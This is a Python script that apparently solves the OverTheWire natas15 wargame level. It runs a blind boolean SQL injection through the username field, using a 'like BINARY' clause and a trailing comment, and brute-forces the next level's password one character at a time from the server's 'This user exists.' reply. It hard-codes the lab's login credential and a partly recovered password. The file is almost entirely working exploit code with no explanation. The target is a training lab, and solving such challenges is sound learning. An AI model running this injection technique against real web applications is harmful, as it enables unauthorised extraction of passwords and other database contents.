import requests
import itertools
import time

url = "http://natas15.natas.labs.overthewire.org"
user = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
prefix = "natas16\" and password like BINARY \""
postfix = "%\"; -- "
possible_values = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
i = 0
max_try = 100
solution = 'WaIHEacj63wnNIBROHeqi3p9t0m5nh'
while len(solution) < 32:
    for value in possible_values:
        trial_solution = solution + value
        content = prefix + trial_solution + postfix
        resp = requests.post(url, data={"username": content}, auth=(user, password))
        if 'This user exists.' in resp.content:
            print(trial_solution + ' is correct')
            solution = trial_solution
            break
        elif 'Error in query.' in resp.content:
            print(trial_solution + ' lead to error')
        else:
            print(trial_solution + ' was tried')
        #time.sleep(1)
